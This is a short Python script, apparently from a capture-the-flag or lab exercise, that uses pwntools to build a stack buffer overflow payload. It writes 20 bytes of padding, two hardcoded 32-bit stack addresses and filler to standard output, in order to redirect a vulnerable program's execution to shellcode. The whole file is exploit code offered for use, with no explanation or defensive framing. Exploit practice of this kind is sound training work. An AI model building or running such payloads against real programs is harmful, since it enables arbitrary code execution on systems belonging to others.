from pwn import *
import sys


address_of_blah = 0xffffd503
address_of_shellcode = 0xffffd542

payload = b'a'*20 
payload += p32(address_of_blah)
payload += b'JUNK'
payload += p32(address_of_shellcode)

sys.stdout.buffer.write(payload)
